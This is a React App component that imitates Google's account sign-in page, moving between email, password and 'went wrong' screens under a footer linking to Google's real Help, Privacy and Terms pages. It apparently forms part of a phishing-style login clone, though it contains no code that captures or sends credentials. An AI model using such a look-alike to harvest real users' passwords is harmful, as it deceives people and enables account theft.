import React, { useState } from 'react';
import './App.css';
import Email from './Email';
import Password from './Password';
import WentWrong from './WentWrong';

function App() {
  const [currentScreen, setCurrentScreen] = useState('email');

  const screen = {
		email: () => <Email setScreen={setCurrentScreen} />,
		password: () => <Password setScreen={setCurrentScreen} />,
		wentWrong: () => <WentWrong setScreen={setCurrentScreen} />,
	};

  return (
		<div className="app">
			<div>{screen[currentScreen]()}</div>
			<div className="bottom_links">
				<div>English(United states)</div>
				<div className="bottom_links_help">
					<a
						href="https://support.google.com/accounts?hl=en"
						target="_blank"
						rel="noreferrer"
					>
						Help
					</a>
					<a
						href="https://accounts.google.com/TOS?loc=NG&hl=en&privacy=true"
						target="_blank"
						rel="noreferrer"
					>
						Privacy
					</a>
					<a
						href="https://accounts.google.com/TOS?loc=NG&hl=en"
						target="_blank"
						rel="noreferrer"
					>
						Terms
					</a>
				</div>
			</div>
		</div>
	);
}

export default App;
